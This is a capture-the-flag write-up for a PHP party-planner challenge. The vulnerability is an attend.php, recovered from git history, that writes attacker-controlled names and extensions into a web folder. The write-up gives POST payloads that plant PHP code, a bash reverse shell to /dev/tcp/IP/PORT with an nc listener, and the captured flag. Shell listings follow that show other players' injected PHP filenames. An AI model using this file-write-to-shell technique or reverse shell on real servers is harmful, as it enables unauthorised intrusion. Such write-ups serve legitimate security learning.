# Challenge

Check out this source code, anything exiting to figure out?

https://htbbinaries.z1.web.core.windows.net/xmasparty.zip

Well I guess you need to check out the running app aswell..

http://xmaspartyplanner.norwayeast.azurecontainer.io/

> **Hint:** So this is about things that never really goes away...

# Writeup

Downloaded the code, without any hints I could not see any exploitable on index.php. Tried git log and saw there was multiple commits. A file called `attend.php` was deleted which was exploitable. It writes to a folder `./incoming/`

```
<?php
if(isset($_POST["submit"])){
    $fname = uniqid($_POST["submit"]);
    $file = fopen("./incoming/".$fname.$_POST["age"], "w");
    $txt = $_POST["name"]." ".$_POST["age"].$_POST["attend"]."\n";
    fwrite($file, $txt);
}
?>
```

So adding a post request with the field `submit` as `test` and all other blanks I got an answer that it was written to a file and warnings that it missed a few variables `age, attend, name`. 

Added `submit=test` and `php` as value on all other fields (age, attend and name). Then I got this url.

```
http://xmaspartyplanner.norwayeast.azurecontainer.io/incoming/test638da436f3771php
```

Changed `age=.php` and `name=<?php echo "hei"; ?>` then I got this url:

```
http://xmaspartyplanner.norwayeast.azurecontainer.io/incoming/test638da49436bca.php
```
And this one said: `Hei .phpphp`. So basically I can now reverse shell to get a remote ssh on this. [This website](https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell) shows me a simple PHP Reverse shell. So i send this new data:

```bash
# Just change IP and PORT to whatever you use.
Submit: test
Name: <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'");?>
Age: .php
```

Then ran `nc -nlvp 1234` on my remote server. Once I got the url I could press it and I had remote shell.

Flag was in root system on `/flag.txt`

```bash
${W4@7_@_P@R7Y_PHP_M@K3Z!}
```

# Playing

I did have a look on other attempts and saw many good ones. Even a remote shell in browser. So simple yet I did not think of that.

```bash
www-data@SandboxHost-638057345438450643:~/html$ ls -lah     
ls -lah
total 312K
drwxrwsr-x 1 www-data www-data 4.0K Dec  5 07:48 .
drwxr-xr-x 1 root     root     4.0K Dec  4 07:07 ..
-rw-r--r-- 1 www-data www-data   11 Dec  5 07:36 638d9f7fe5cb4php
-rw-r--r-- 1 www-data www-data   11 Dec  5 07:37 638d9fcf90552php
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:40 a638d3e1177c9a1
-rw-r--r-- 1 www-data www-data   10 Dec  5 00:25 aaa638d3a661c8a42
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:40 abctest638d3dff59d101
-rw-r--r-- 1 root     www-data  420 Dec  4 07:06 attend.php
-rw-r--r-- 1 www-data www-data  296 Dec  5 00:46 attend.php
638d3f492c93c
-rw-r--r-- 1 www-data www-data  304 Dec  5 00:46 attend.php
638d3f5430b28.php
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:56 attend.php
638d41b2106631
638d3f43f2952www-data www-data  296 Dec  5 00:45 attend.php
-rw-r--r-- 1 www-data www-data  296 Dec  5 00:45 attend.php638d3f2577467
-rw-r--r-- 1 www-data www-data  304 Dec  5 00:46 attend.php638d3f5a960b5.php
-rw-r--r-- 1 www-data www-data  325 Dec  5 00:47 attend.php638d3fbb6c156
-rw-r--r-- 1 www-data www-data  329 Dec  5 00:48 attend.php638d3fd02ae85.php
-rw-r--r-- 1 www-data www-data  329 Dec  5 00:48 attend.php638d3fd0f3770.php
-rwxr-xr-x 1 root     www-data 204K Dec  4 07:06 bg.png
-rw-r--r-- 1 www-data www-data  304 Dec  5 00:46 fewnfiewuierburbfebfrefburefber.php638d3f7ec9459.php
-rw-r--r-- 1 www-data www-data  296 Dec  5 00:47 fewnfiewuierburbfebfrefburefber.php638d3f85349be
drwxrwsr-x 1 www-data www-data  12K Dec  5 08:13 incoming
-rw-r--r-- 1 root     www-data 2.4K Dec  4 07:06 index.php
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:56 index.php
638d41c10916c1
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:39 secrett.php
638d3da8195cc1
www-data@SandboxHost-638057345438450643:~/html$ 
```

Attend.php, not quite the one we see in the git but works the same way to exploit.

```php
www-data@SandboxHost-638057345438450643:~/html$ cat attend.php
cat attend.php
<?php
ini_set('display_errors', 'On');
error_reporting(E_ALL);
if(isset($_POST["submit"])){
    try{
    $fname = uniqid($_POST["submit"]);
    $file = fopen("./incoming/".$fname.$_POST["age"], "w");
    $txt = $_POST["name"]." ".$_POST["age"].$_POST["attend"]."\n";
    fwrite($file, $txt);
    echo("Wrote file ".$fname);

    } catch(Exception $e){
        echo $e;
        echo "<br/>";
    }
    fclose($file);
}
?>www-data@SandboxHost-638057345438450643:~/html$ 
```

incoming folder listed.

```bash
www-data@SandboxHost-638057345438450643:~/html/incoming$ ls -lah
ls -lah
total 724K
drwxrwsr-x 1 www-data www-data  12K Dec  5 08:13 .
drwxrwsr-x 1 www-data www-data 4.0K Dec  5 07:48 ..
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:37 .php638d3d4ec08cc1
-rw-r--r-- 1 www-data www-data    5 Dec  5 06:26 .php638d8effe97780
-rw-r--r-- 1 www-data www-data    5 Dec  5 06:26 .php638d8f20d1e0b0
-rw-r--r-- 1 www-data www-data    5 Dec  5 06:26 .php638d8f22241420
-rw-r--r-- 1 www-data www-data    5 Dec  5 06:26 .php638d8f22e080a0
-rw-r--r-- 1 www-data www-data    5 Dec  5 06:26 .php638d8f23a8de00
-rw-r--r-- 1 www-data www-data    5 Dec  5 06:26 .php638d8f247bf160
-rw-r--r-- 1 www-data www-data    5 Dec  5 06:26 .php638d8f26d25ca0
-rw-r--r-- 1 www-data www-data    5 Dec  5 06:26 .php638d8f2991e370
-rw-r--r-- 1 www-data www-data    5 Dec  5 06:26 .php638d8f2aaa4910
-rw-r--r-- 1 www-data www-data    5 Dec  5 06:26 .php638d8f2cb8e550
-rw-r--r-- 1 www-data www-data   14 Dec  5 06:58 .php638d96acd4809.php
-rw-r--r-- 1 www-data www-data   82 Dec  5 07:55 .php638da3de5cc5f.php
-rw-r--r-- 1 www-data www-data   82 Dec  5 07:55 .php638da3ef4abcc.php
-rw-r--r-- 1 www-data www-data  150 Dec  5 07:55 .php638da3fba05e8.php
-rw-r--r-- 1 www-data www-data   14 Dec  5 01:01 1638d42e13a9c0.php
-rw-r--r-- 1 www-data www-data   30 Dec  5 01:02 1638d430d3eb49.php
-rw-r--r-- 1 www-data www-data   25 Dec  5 01:04 1638d43ae29096.php
-rw-r--r-- 1 www-data www-data   42 Dec  5 01:06 1638d44007f2af.php
-rw-r--r-- 1 www-data www-data    8 Dec  5 07:53 1638da3966f08610
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:11 638d37242079b1
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:11 638d372606f6d1
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:11 638d372689aed1
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:11 638d3726e6e8a1
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:11 638d372747b071
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:13 638d378df2a191
-rw-r--r-- 1 www-data www-data   10 Dec  5 00:32 638d3c003ead42
-rw-r--r-- 1 www-data www-data   15 Dec  5 00:32 638d3c2a85827asdf2
-rw-r--r-- 1 www-data www-data   14 Dec  5 00:32 638d3c2b61cf8asdf2
-rw-r--r-- 1 www-data www-data   14 Dec  5 00:32 638d3c2c7169fasdf2
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:35 638d3cc15e46d
-rw-r--r-- 1 www-data www-data   30 Dec  5 00:36 638d3d02737ea.php
-rw-r--r-- 1 www-data www-data   34 Dec  5 00:36 638d3d16c43ca.php
-rw-r--r-- 1 www-data www-data   37 Dec  5 00:36 638d3d27988b8.php
-rw-r--r-- 1 www-data www-data   41 Dec  5 00:37 638d3d3263f49.php
-rw-r--r-- 1 www-data www-data   39 Dec  5 00:37 638d3d5e21d5c.php
-rw-r--r-- 1 www-data www-data   38 Dec  5 00:37 638d3d605049a.php
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:55 638d418c337a61
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:55 638d4196190931
-rw-r--r-- 1 www-data www-data   11 Dec  5 06:21 638d8dfa3afdd.php
-rw-r--r-- 1 www-data www-data    5 Dec  5 06:26 638d8f032719c0
-rw-r--r-- 1 www-data www-data   22 Dec  5 07:26 638d9d1ceabc5php
-rw-r--r-- 1 www-data www-data   22 Dec  5 07:26 638d9d207fdcbphp
-rw-r--r-- 1 www-data www-data   22 Dec  5 07:26 638d9d21a732aphp
-rw-r--r-- 1 www-data www-data   22 Dec  5 07:26 638d9d22dcad7php
-rw-r--r-- 1 www-data www-data   22 Dec  5 07:26 638d9d240529aphp
-rw-r--r-- 1 www-data www-data   22 Dec  5 07:26 638d9d258e02ephp
-rw-r--r-- 1 www-data www-data   22 Dec  5 07:26 638d9d26d49c6php
-rw-r--r-- 1 www-data www-data   22 Dec  5 07:26 638d9d280e0e2php
-rw-r--r-- 1 www-data www-data    2 Dec  5 07:34 638d9f0f58ce7
-rw-r--r-- 1 www-data www-data   17 Dec  5 07:35 638d9f34d88acphp||
-rw-r--r-- 1 www-data www-data   11 Dec  5 07:35 638d9f51421e5php
-rw-r--r-- 1 www-data www-data   11 Dec  5 07:38 638d9fe07469bphp
-rw-r--r-- 1 www-data www-data   11 Dec  5 07:38 638d9ff78839ephp
-rw-r--r-- 1 www-data www-data   11 Dec  5 07:38 638d9ff803cacphp
-rw-r--r-- 1 www-data www-data   11 Dec  5 07:38 638d9ff865987php
-rw-r--r-- 1 www-data www-data   11 Dec  5 07:38 638d9ff8698f9php
-rw-r--r-- 1 www-data www-data   11 Dec  5 07:38 638d9ff86fab8php
-rw-r--r-- 1 www-data www-data   11 Dec  5 07:38 638d9ff91abadphp
-rw-r--r-- 1 www-data www-data   11 Dec  5 07:38 638da00db1206php
-rw-r--r-- 1 www-data www-data   11 Dec  5 07:39 638da01f4d809php
-rw-r--r-- 1 www-data www-data   11 Dec  5 07:50 638da2e399ed2php
-rw-r--r-- 1 www-data www-data   11 Dec  5 07:51 638da2f282332php
-rw-r--r-- 1 www-data www-data    8 Dec  5 07:51 638da2f535007php
-rw-r--r-- 1 www-data www-data    8 Dec  5 07:51 638da30570d9bphp
-rw-r--r-- 1 www-data www-data    8 Dec  5 07:52 638da32cd715ephp
-rw-r--r-- 1 www-data www-data    8 Dec  5 07:52 638da33cce9f2php
-rw-r--r-- 1 www-data www-data    8 Dec  5 07:54 638da3c8f0c3810
-rw-r--r-- 1 www-data www-data   10 Dec  5 07:55 638da3eae64fc.php
-rw-r--r-- 1 www-data www-data   11 Dec  5 07:55 638da40daa030.php
-rw-r--r-- 1 www-data www-data   23 Dec  5 07:56 638da4302dd9c.php
-rw-r--r-- 1 www-data www-data   25 Dec  5 07:57 638da44d592cd.php
-rw-r--r-- 1 www-data www-data   37 Dec  5 07:57 638da479273c1.php
-rw-r--r-- 1 www-data www-data   10 Dec  5 00:29 <?php echo 1?>638d3b768b4ce2
-rw-r--r-- 1 www-data www-data   10 Dec  5 00:30 <?php echo phpinfo();?> .php638d3b8bc42bc2
-rw-r--r-- 1 www-data www-data    5 Dec  5 06:27 <?php echo phpinfo();?>638d8f391fabb0
-rw-r--r-- 1 www-data www-data   49 Dec  5 06:27 <?php echo phpinfo();?>638d8f3ee95d9<?php echo phpinfo();?>
-rw-r--r-- 1 www-data www-data   71 Dec  5 06:27 <?php echo phpinfo();?>638d8f439b20d<?php echo phpinfo();?>
-rw-r--r-- 1 www-data www-data   71 Dec  5 06:27 <?php echo phpinfo();?>638d8f4499a17<?php echo phpinfo();?>
-rw-r--r-- 1 www-data www-data   71 Dec  5 06:27 <?php echo phpinfo();?>638d8f455a4be<?php echo phpinfo();?>
-rw-r--r-- 1 www-data www-data   71 Dec  5 06:27 <?php echo phpinfo();?>638d8f461f92e<?php echo phpinfo();?>
-rw-r--r-- 1 www-data www-data   71 Dec  5 06:27 <?php echo phpinfo();?>638d8f46d0d68<?php echo phpinfo();?>
-rw-r--r-- 1 www-data www-data   90 Dec  5 08:11 True638da7a6b3ee432
-rw-r--r-- 1 www-data www-data   90 Dec  5 08:12 True638da7d9560c1php
-rw-r--r-- 1 www-data www-data   90 Dec  5 08:12 True638da7db449a2php
-rw-r--r-- 1 www-data www-data   90 Dec  5 08:12 True638da7db96aedphp
-rw-r--r-- 1 www-data www-data   90 Dec  5 08:12 True638da7dbeeb45php
-rw-r--r-- 1 www-data www-data   90 Dec  5 08:12 True638da7dc4ab12php
-rw-r--r-- 1 www-data www-data   90 Dec  5 08:12 True638da7dca2358php
-rw-r--r-- 1 www-data www-data  329 Dec  5 00:55 a638d4185a3314.php
-rw-r--r-- 1 www-data www-data   34 Dec  5 02:16 a638d546d983ef123.php
-rw-r--r-- 1 www-data www-data   34 Dec  5 02:17 a638d54ae80cb6123.php
-rw-r--r-- 1 www-data www-data   34 Dec  5 02:21 a638d559a12bb7123.php
-rw-r--r-- 1 www-data www-data   37 Dec  5 02:22 a638d55c9b26a0123.php
-rw-r--r-- 1 www-data www-data   36 Dec  5 02:24 a638d56485bada123.php
-rw-r--r-- 1 www-data www-data   48 Dec  5 02:25 a638d56858301f123.php
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:37 abc638d3d5c275461
-rw-r--r-- 1 www-data www-data   10 Dec  5 00:29 d638d3b5fc95f12
-rw-r--r-- 1 www-data www-data   10 Dec  5 00:29 d638d3b6131ef22
-rw-r--r-- 1 www-data www-data   10 Dec  5 00:29 d638d3b62097e02
-rw-r--r-- 1 www-data www-data   10 Dec  5 00:29 d638d3b62be10a2
-rw-r--r-- 1 www-data www-data   10 Dec  5 00:29 d638d3b638e26f2
-rw-r--r-- 1 www-data www-data   51 Dec  5 01:31 decoy.php
-rw-r--r-- 1 www-data www-data    7 Dec  5 06:20 flag.txt638d8d91e3d161
-rw-r--r-- 1 www-data www-data    7 Dec  5 06:21 flag.txt638d8deed53f41
-rw-r--r-- 1 www-data www-data  122 Dec  5 06:52 hm638d9536e00f1<?php echo shell_exec('cat flag.txt');?>
-rw-r--r-- 1 www-data www-data  123 Dec  5 06:52 hm638d953cbcea1<?php echo shell_exec('cat flag.txt');?>
-rw-r--r-- 1 www-data www-data  125 Dec  5 06:52 hm638d95427b15a<?php echo shell_exec('cats flag.txt');?>
-rw-r--r-- 1 www-data www-data   98 Dec  5 00:18 index.php
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:11 ok638d371a7630e1
-rw-r--r-- 1 www-data www-data   14 Dec  5 06:59 payload638d96c084e19.php
-rw-r--r-- 1 www-data www-data   82 Dec  5 06:59 payload638d96e4b6177.php
-rw-r--r-- 1 www-data www-data   82 Dec  5 07:54 payload638da39bae3ab.php
-rw-r--r-- 1 www-data www-data  150 Dec  5 07:54 payload638da3a76db2d.php
-rw-r--r-- 1 www-data www-data  150 Dec  5 07:55 pl638da4005d13f.php
-rw-r--r-- 1 www-data www-data   82 Dec  5 07:56 pl638da412b9c55.php
-rw-r--r-- 1 www-data www-data   82 Dec  5 07:56 pl638da42515de5.php
-rw-r--r-- 1 www-data www-data   90 Dec  5 07:56 pl638da446b2b31flag.txt
-rw-r--r-- 1 www-data www-data  154 Dec  5 07:57 pl638da481dac7cflag.txt
-rw-r--r-- 1 www-data www-data  150 Dec  5 07:58 pl638da4993a8a9.php
-rw-r--r-- 1 www-data www-data  150 Dec  5 07:58 pl638da4a3a6212.php
-rw-r--r-- 1 www-data www-data   22 Dec  5 01:00 qqqq.php
-rw-r--r-- 1 www-data www-data   10 Dec  5 00:24 sdf.php638d3a56112462
-rw-r--r-- 1 www-data www-data   10 Dec  5 00:25 sdf.php638d3a5c58ee22
-rw-r--r-- 1 www-data www-data   10 Dec  5 00:24 sdf638d3a53122212
-rw-r--r-- 1 www-data www-data    7 Dec  5 00:09 sendme638d36b9761ac1
-rw-r--r-- 1 www-data www-data   25 Dec  5 00:19 sendme638d3904f0b0c
-rw-r--r-- 1 www-data www-data   29 Dec  5 00:19 sendme638d392fef1cb.php
-rw-r--r-- 1 www-data www-data   33 Dec  5 00:20 sendme638d394cdb044.php
-rw-r--r-- 1 www-data www-data   40 Dec  5 00:22 sendme638d39ab90f18.php
-rw-r--r-- 1 www-data www-data   38 Dec  5 00:22 sendme638d39d9ca6c5.php
-rw-r--r-- 1 www-data www-data   42 Dec  5 00:23 sendme638d3a1857c23.php
-rw-r--r-- 1 www-data www-data   10 Dec  5 00:24 sendme638d3a3d0cea42
-rw-r--r-- 1 www-data www-data   10 Dec  5 00:30 t638d3ba1836db2
-rw-r--r-- 1 www-data www-data   10 Dec  5 00:31 t638d3bc4f2c682
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:10 test.php
638d3709821421
-rw-r--r-- 1 www-data www-data    7 Dec  5 00:10 test.php638d36e8c95681
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:10 test.php638d37022bcca1
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:21 test638d397845ff81
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:22 test638d39bd5239f1
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:22 test638d39cc2fa0e1
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:23 test638d39f69dbda1
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:23 test638d3a06c421b1
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:23 test638d3a07e93001
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:23 test638d3a0c09ae51
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:23 test638d3a119734e1
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:23 test638d3a1b8c44f1
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:24 test638d3a31a69ad1
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:25 test638d3a92f3e471
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:25 test638d3a93ba90c1
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:25 test638d3a94561b71
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:25 test638d3a94b5b071
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:25 test638d3a95163501
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:25 test638d3a95646081
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:25 test638d3a95b21f51
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:29 test638d3b7f029f81
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:29 test638d3b80106d61
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:30 test638d3b95d7b7c1
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:30 test638d3bbd79bc61
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:30 test638d3bbe4872c1
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:30 test638d3bbee77bc1
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:30 test638d3bbf4df551
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:30 test638d3bbf6c5511
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:30 test638d3bbfa18321
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:30 test638d3bbfdab091
-rw-r--r-- 1 www-data www-data    9 Dec  5 00:55 test638d417fce01d1
-rw-r--r-- 1 www-data www-data   11 Dec  5 07:56 test638da436f3771php
-rw-r--r-- 1 www-data www-data   14 Dec  5 08:08 true638da6f05de91fjas
-rw-r--r-- 1 www-data www-data   34 Dec  5 08:09 true638da73419299fjas
-rw-r--r-- 1 www-data www-data   92 Dec  5 08:10 true638da7648e928fjas
-rw-r--r-- 1 www-data www-data  125 Dec  5 06:53 yo638d95563180a<?php echo shell_exec('curl flag.txt');?>
-rw-r--r-- 1 www-data www-data  174 Dec  5 06:53 yo638d95622ae25<?php echo shell_exec('curl flag.txt');?>
-rw-r--r-- 1 www-data www-data  116 Dec  5 06:53 yo638d957a02d90<?php echo shell_exec('curl vg.no');?>
-rw-r--r-- 1 www-data www-data   48 Dec  5 06:54 yo638d95bea8cc9<?php echo shell_exec('curl vg.no');?>
-rw-r--r-- 1 www-data www-data   14 Dec  5 06:58 yo638d96a4e682d.php
-rw-r--r-- 1 www-data www-data   14 Dec  5 06:58 yo638d96a961272.php
www-data@SandboxHost-638057345438450643:~/html/incoming$ 
```